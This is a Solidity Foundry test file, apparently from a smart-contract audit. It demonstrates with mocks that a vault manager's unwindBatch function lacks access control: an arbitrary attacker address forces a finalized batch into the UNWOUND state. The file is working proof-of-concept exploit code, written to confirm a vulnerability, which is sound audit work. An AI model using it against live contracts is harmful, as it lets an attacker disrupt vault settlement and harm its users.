// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../shared/Harness.sol";

// POC-01: unwindBatch has no access control -> anyone can force UNWOUND state
contract POC01Test is Test, ITypes {

    VaultManagerHarness manager;
    MockPortfolio        portfolio;
    MockExecutor         executor;
    MockShare            share;

    address constant ADMIN    = address(0xA0);
    address constant SETTLER  = address(0xA1);
    address constant PROPOSER = address(0xA2);
    address constant ATTACKER = address(0xAA);
    address constant TRADER   = address(0xBB);

    uint16  constant VID = 0;
    uint16  constant TID = 0;
    bytes32 constant SYM = bytes32("USDC");

    function setUp() public {
        portfolio = new MockPortfolio();
        executor  = new MockExecutor(address(portfolio));
        share     = new MockShare(VID);
        manager   = new VaultManagerHarness(ADMIN, SETTLER, address(portfolio));
        vm.startPrank(ADMIN);
        manager.addToken(AssetInfo(SYM, AssetType.QUOTE, 6, 1, 10_000_000));
        share.setManager(address(manager));
        executor.setManager(address(manager));
        executor.setTrader(TRADER);
        uint32[] memory cids = new uint32[](1); cids[0] = 1;
        uint16[] memory toks = new uint16[](1); toks[0] = TID;
        VaultDetails memory vd = VaultDetails(
            "Vault", PROPOSER, TRADER, VaultStatus.ACTIVE,
            address(executor), address(share), address(0), cids, toks
        );
        uint16[]  memory it = new uint16[](1); it[0] = TID;
        uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
        portfolio.setBalance(address(executor), SYM, 1_000_000e6);
        manager.registerVault(VID, vd, it, ia, 2000e18);
        vm.stopPrank();
    }

    function testPOC01_UnwindBatchNoAccessControl() public {
        console.log("\n=== POC-01: unwindBatch No Access Control ===");

        uint256[] memory pr = new uint256[](1); pr[0] = 1e18;
        uint16[]  memory vt = new uint16[](1);  vt[0] = TID;
        uint256[] memory vb = new uint256[](1); vb[0] = 1_000_000e6;
        VaultState[] memory vs = new VaultState[](1);
        vs[0] = VaultState(VID, vt, vb);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
        console.log("[+] SETTLER finalized batch 0");

        vm.warp(block.timestamp + 24 hours + 1);
        console.log("[+] Warp 24h+1s");

        vm.prank(ATTACKER);
        manager.unwindBatch(0);
        console.log("[EXPLOIT] Anyone called unwindBatch(0) - no role check");

        ITypes.BatchStatus status = manager.batchStatus(0);
        assertEq(uint256(status), uint256(ITypes.BatchStatus.UNWOUND), "POC-01 FAILED");
        console.log("[EXPLOIT] Batch status: UNWOUND (expected FINALIZED)");
        console.log("[EXPLOIT] POC-01 CONFIRMED");
    }
}
